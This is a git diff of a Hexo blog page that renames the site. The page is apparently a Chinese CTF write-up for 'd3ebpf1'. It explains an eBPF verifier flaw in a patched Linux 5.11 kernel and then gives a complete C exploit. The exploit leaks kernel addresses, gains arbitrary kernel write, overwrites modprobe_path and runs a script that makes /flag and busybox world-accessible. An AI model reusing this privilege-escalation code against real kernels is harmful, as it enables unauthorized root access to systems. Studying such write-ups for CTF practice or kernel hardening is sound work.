@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="d3ebpf1, Hexo">
+    <meta name="keywords" content="d3ebpf1, q1ming">
     <meta name="description" content="CHECKboot
 可能没有开kpti；
 init
@@ -26,7 +26,7 @@ cd linux-5.11gi">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>d3ebpf1 | Hexo</title>
+    <title>d3ebpf1 | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -73,7 +73,7 @@ cd linux-5.11gi">
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -177,7 +177,7 @@ cd linux-5.11gi">
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -420,10 +420,10 @@ cd linux-5.11gi">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="CHECK"><a href="#CHECK" class="headerlink" title="CHECK"></a>CHECK</h2><h3 id="boot"><a href="#boot" class="headerlink" title="boot"></a>boot</h3><p><img src="/images/1732774954550.png" alt="1732774954550"></p>
+                <h2 id="CHECK"><a href="#CHECK" class="headerlink" title="CHECK"></a>CHECK</h2><h3 id="boot"><a href="#boot" class="headerlink" title="boot"></a>boot</h3><p><img src="/images/1732774954550.png"></p>
 <p>可能没有开kpti；</p>
-<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p><img src="/images/1732775001826.png" alt="1732775001826"></p>
-<h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p><img src="/images/1733387166809.png" alt="1733387166809"></p>
+<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p><img src="/images/1732775001826.png"></p>
+<h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p><img src="/images/1733387166809.png"></p>
 <p>开好梯子，vim里复制完整路径？</p>
 <p>解压：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">tar -xvzf linux-hwe-5.11_5.11.0.orig.tar.gz<br></code></pre></td></tr></table></figure>
@@ -432,40 +432,40 @@ cd linux-5.11gi">
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd linux-5.11<br>git apply &lt; ../diff #取决于diff文件的具体路径<br></code></pre></td></tr></table></figure>
 
 <p>patch成功：</p>
-<p><img src="/images/1733387632065.png" alt="1733387632065"></p>
+<p><img src="/images/1733387632065.png"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">make menuconfig<br><br>sudo sed -i &#x27;s/CONFIG_SYSTEM_TRUSTED_KEYS=/#&amp;/&#x27; ./.config<br></code></pre></td></tr></table></figure>
 
 <p>查看.config文件发现有调试符号：</p>
-<p><img src="/images/1733387818714.png" alt="1733387818714"></p>
+<p><img src="/images/1733387818714.png"></p>
 <p>确认携带-g参数：</p>
-<p><img src="/images/1733387881355.png" alt="1733387881355"></p>
+<p><img src="/images/1733387881355.png"></p>
 <p>编译：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">make bzImage -j$(nproc)<br></code></pre></td></tr></table></figure>
 
 <p>遇到报错：</p>
-<p><img src="/images/1733391438092.png" alt="1733391438092"></p>
+<p><img src="/images/1733391438092.png"></p>
 <p>查看pahole版本：</p>
-<p><img src="/images/1733391455135.png" alt="1733391455135"></p>
+<p><img src="/images/1733391455135.png"></p>
 <p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/woay2008/article/details/132748659">https://blog.csdn.net/woay2008/article/details/132748659</a></p>
 <p>修改scripts&#x2F;pahole-flags.sh 脚本：</p>
-<p><img src="/images/1733391564297.png" alt="1733391564297"></p>
+<p><img src="/images/1733391564297.png"></p>
 <p>不管用，深入看Makefile：Line1165</p>
-<p><img src="/images/1733393078083.png" alt="1733393078083"></p>
-<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p><img src="/images/1732774917836.png" alt="1732774917836"></p>
+<p><img src="/images/1733393078083.png"></p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p><img src="/images/1732774917836.png"></p>
 <p>只需要关心中间一个，其余两个都是cve；</p>
 <p>内核源代码：</p>
 <p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c">https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c</a></p>
 <p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c#L6455">https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c#L6455</a></p>
-<p><img src="/images/1734092739623.png" alt="1734092739623"></p>
-<p><img src="/images/1734092753093.png" alt="1734092753093"></p>
+<p><img src="/images/1734092739623.png"></p>
+<p><img src="/images/1734092753093.png"></p>
 <p>所以就是在执行右移操作的时候，检查源寄存器的边界值和架构值的关系，</p>
 <p>关闭编译优化：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -O0 demo.c -o d<br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/1734093563364.png" alt="1734093563364"></p>
+<p><img src="/images/1734093563364.png"></p>
 <p>将一个变量右移64位的时候，会先将移位值加载到寄存器rcx中，然后64位架构只允许最多右移63位，这个指令虽然送进去了cl是8位，但是在CPU处理的时候会仅取其低6位作为移位值，所以也就是0，相当于没操作！</p>
 <p>这样这个寄存器的值仍然是1，但是这个寄存器在verifier中却被认为是0，因此，我们获得了一个运行时值为1、确信为0的寄存器！</p>
-<h2 id="攻击模板"><a href="#攻击模板" class="headerlink" title="攻击模板"></a>攻击模板</h2><p><img src="/images/1734094897367.png" alt="1734094897367"></p>
+<h2 id="攻击模板"><a href="#攻击模板" class="headerlink" title="攻击模板"></a>攻击模板</h2><p><img src="/images/1734094897367.png"></p>
 <p>利用漏洞中的btf_array中任意偏移写：</p>
 <ol>
 <li>劫持map-&gt;ops到我们能控制的array空间中；</li>
@@ -477,7 +477,7 @@ cd linux-5.11gi">
 </ol>
 <figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">value[<span class="hljs-number">2</span>] = <span class="hljs-number">0x12345678</span>;<br>   value[<span class="hljs-number">3</span>] = <span class="hljs-built_in">map</span> + <span class="hljs-number">0x110</span>;<br>   value[<span class="hljs-number">4</span>] = array_map_get_next_key;<br>   value[<span class="hljs-number">5</span>] = BPF_MAP_TYPE_STACK + <span class="hljs-number">0x400000000</span>;<br>   value[<span class="hljs-number">6</span>] = <span class="hljs-number">0xffffffff00002000</span>;<br>   value[<span class="hljs-number">7</span>] = <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure>
 
-<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1734096916375.png" alt="1734096916375"></p>
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1734096916375.png"></p>
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>exp.c:</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now pid == %p\n&quot;</span>, getpid());<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//CPU绑核</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bindCore</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_insn.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>),                    <br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           <br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-8</span>),          <br>        BPF_ST_MEM(BPF_DW, BPF_REG_2, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),            <br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem), <span class="hljs-comment">//第一个参数是fd，第二个参数是&amp;key，第三个参数 是&amp;value</span><br>        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              <br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),          <br>        BPF_EXIT_INSN(),                                 <br><br>        BPF_MOV64_IMM(BPF_REG_6, <span class="hljs-number">0</span>),<br>        BPF_ALU64_IMM(BPF_LSH, BPF_REG_6, <span class="hljs-number">32</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, <span class="hljs-number">1</span>),<br><br>        BPF_MOV64_IMM(BPF_REG_7, <span class="hljs-number">0</span>),<br>        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, <span class="hljs-number">32</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="hljs-number">64</span>),<br><br>        BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),<br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br><br>        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),<br>        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="hljs-number">0x110</span>),<br>        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           <br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-16</span>),          <br>        BPF_ST_MEM(BPF_DW, BPF_REG_2, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),            <br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem), <span class="hljs-comment">//第一个参数是fd，第二个参数是&amp;key，第三个参数 是&amp;value</span><br>        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              <br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),          <br>        BPF_EXIT_INSN(),             <br><br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), <span class="hljs-comment">//r9 -&gt; expmap-&gt;array[0]</span><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8,<span class="hljs-number">0</span>),<br>        BPF_STX_MEM(BPF_DW,BPF_REG_9,BPF_REG_0,<span class="hljs-number">0x0</span>), <br><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">0xc0</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8,<span class="hljs-number">0</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_STX_MEM(BPF_DW,BPF_REG_9,BPF_REG_0,<span class="hljs-number">0x0</span>), <br><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_9,<span class="hljs-number">0</span>),<br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_4, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),          <br>        BPF_EXIT_INSN(),  <br><br>        <span class="hljs-comment">//begin aaw</span><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_9,<span class="hljs-number">0</span>), <span class="hljs-comment">//R4 -&gt; map+0x110</span><br>        BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, <span class="hljs-number">0xc0</span>), <span class="hljs-comment">//R8 -&gt; btf_array</span><br>        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_4, <span class="hljs-number">0</span>),<br><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_9,<span class="hljs-number">0</span>), <span class="hljs-comment">//R4 -&gt; array_map_get_next_key</span><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">0x110</span>+<span class="hljs-number">14</span>*<span class="hljs-number">8</span>),<br>        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_4, <span class="hljs-number">0</span>),<br><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_9,<span class="hljs-number">0</span>),<span class="hljs-comment">//R4 -&gt; BPF_MAP_TYPE_STACK + 0x400000000;</span><br>        BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, <span class="hljs-number">0x110</span>+<span class="hljs-number">14</span>*<span class="hljs-number">8</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">0x18</span>),<br>        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_4, <span class="hljs-number">0</span>),<br><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_9,<span class="hljs-number">0</span>), <span class="hljs-comment">//R4 -&gt; 0xffffffff00002000</span><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">0x8</span>), <span class="hljs-comment">// 0x20</span><br>        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_4, <span class="hljs-number">0</span>),<br><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, <span class="hljs-number">8</span>),<br>        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_9,<span class="hljs-number">0</span>), <span class="hljs-comment">//R4 -&gt; 0LL</span><br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">0x8</span>), <span class="hljs-comment">// 0x28</span><br>        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_4, <span class="hljs-number">0</span>),<br><br><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br>        BPF_EXIT_INSN(),<br><br>&#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_LOG_SZ 0x20000</span><br><span class="hljs-type">char</span> bpf_log_buf[BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-type">int</span> sockets[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> map_fd1;<br><span class="hljs-type">int</span> map_fd2;<br><span class="hljs-type">int</span> prog_fd;<br><span class="hljs-type">uint32_t</span> key;<br><span class="hljs-type">uint64_t</span>* value1;<br><span class="hljs-type">uint64_t</span>* value2;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size,</span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_type = map_type,<br>                .key_size = key_size,<br>                .value_size = value_size,<br>                .max_entries = max_entries,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>)key,<br>        .value = (<span class="hljs-type">uint64_t</span>)value,<br>    &#125;;<br><br>    <span class="hljs-comment">// 使用 BPF_MAP_LOOKUP_ELEM 获取 map 中的元素</span><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">size_t</span> ker_offset;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* value, <span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>                .flags = flags,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">aaw</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">size_t</span> val)</span>&#123;<br>    <span class="hljs-type">size_t</span> key = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> val1 = val &amp; <span class="hljs-number">0xffffffff</span>;<br>    val1--;<br>    <span class="hljs-type">size_t</span> val2 = val &gt;&gt; <span class="hljs-number">32</span>;<br>    val2--;<br>    value[<span class="hljs-number">0</span>] = val1;<br>    bpf_map_update_elem(map_fd, &amp;key, value, addr);<br>    value[<span class="hljs-number">0</span>] = val2;<br>    bpf_map_update_elem(map_fd, &amp;key, value, addr+<span class="hljs-number">4</span>);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    save_status();<br>    bindCore(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>), <span class="hljs-number">0x2000</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<span class="hljs-comment">//, err_exit(&quot;BPF_MAP_CREATE&quot;);</span><br><br>    <span class="hljs-type">int</span> expmap_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>), <span class="hljs-number">0x2000</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (expmap_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<span class="hljs-comment">//, err_exit(&quot;BPF_MAP_CREATE&quot;);</span><br><br>    prog_fd = bpf(BPF_PROG_LOAD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (prog_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//puts(bpf_log_buf);</span><br>        perror(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>);<br>    &#125;			<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prog_fd == %d\n&quot;</span>, prog_fd);<br>    <span class="hljs-comment">//puts(bpf_log_buf);</span><br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, sockets) &lt; <span class="hljs-number">0</span>)<br>        perror(<span class="hljs-string">&quot;socketpair()&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (setsockopt(sockets[<span class="hljs-number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="hljs-keyword">sizeof</span>(prog_fd)) &lt; <span class="hljs-number">0</span>)<br>        perror(<span class="hljs-string">&quot;socketpair SO_ATTACH_BPF&quot;</span>);<br><br><br>	<span class="hljs-type">char</span> s[<span class="hljs-number">0x1000</span>];<br>	write(sockets[<span class="hljs-number">0</span>], s, <span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-type">size_t</span> key = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    bpf_map_get_elem(expmap_fd, &amp;key, value);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak : %p\n&quot;</span>, (<span class="hljs-type">void</span> *)value[<span class="hljs-number">0</span>]);<br><br>    ker_offset = value[<span class="hljs-number">0</span>] - <span class="hljs-number">0xffffffff820363a0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ker_offset == %p\n&quot;</span>, (<span class="hljs-type">void</span> *)ker_offset);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;map_list == %p\n&quot;</span>, (<span class="hljs-type">void</span> *)value[<span class="hljs-number">1</span>]);<br>    <span class="hljs-type">size_t</span> <span class="hljs-built_in">map</span> = value[<span class="hljs-number">1</span>] - <span class="hljs-number">0xc0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;map == %p\n&quot;</span>, (<span class="hljs-type">void</span> *)<span class="hljs-built_in">map</span>);<br><br>    <span class="hljs-type">size_t</span> modprobe_path = ker_offset + <span class="hljs-number">0xffffffff82a6c240</span>;<br>    <span class="hljs-type">size_t</span> array_map_get_next_key = ker_offset + <span class="hljs-number">0xffffffff8120e6b0</span>;<br><br>    value[<span class="hljs-number">2</span>] = <span class="hljs-number">0x12345678</span>;<br>    value[<span class="hljs-number">3</span>] = <span class="hljs-built_in">map</span> + <span class="hljs-number">0x110</span>;<br>    value[<span class="hljs-number">4</span>] = array_map_get_next_key;<br>    value[<span class="hljs-number">5</span>] = BPF_MAP_TYPE_STACK + <span class="hljs-number">0x400000000</span>;<br>    value[<span class="hljs-number">6</span>] = <span class="hljs-number">0xffffffff00002000</span>;<br>    value[<span class="hljs-number">7</span>] = <span class="hljs-number">0LL</span>;<br>    bpf_map_update_elem(expmap_fd, &amp;key, value, BPF_ANY);<br><br>    write(sockets[<span class="hljs-number">0</span>], s, <span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-type">char</span> path[] = <span class="hljs-string">&quot;/tmp/a\x00\x00&quot;</span>;<br>    <span class="hljs-type">size_t</span> val;<br>    <span class="hljs-built_in">memcpy</span>(&amp;val, path, <span class="hljs-number">8</span>);<br>    aaw(map_fd, modprobe_path, val);<br><br>    system(<span class="hljs-string">&quot;touch /tmp/error&quot;</span>);<br>    <span class="hljs-type">int</span> ef = open(<span class="hljs-string">&quot;/tmp/error&quot;</span>, <span class="hljs-number">2</span>);<br>    write(ef, <span class="hljs-string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="hljs-number">4</span>);<br>    close(ef);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/error&quot;</span>);<br><br>    <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag\nchmod 777 /bin/busybox\n\x00&quot;</span>;<br>    system(<span class="hljs-string">&quot;touch /tmp/a&quot;</span>);<br>    <span class="hljs-type">int</span> af = open(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-number">2</span>);<br>    write(af, shellcode, <span class="hljs-built_in">strlen</span>(shellcode));<br>    close(af);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/a&quot;</span>);<br>    system(<span class="hljs-string">&quot;/tmp/error&quot;</span>);<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    read(f, flag, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(flag);<br>    <br><br><br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>
 
@@ -504,7 +504,7 @@ cd linux-5.11gi">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
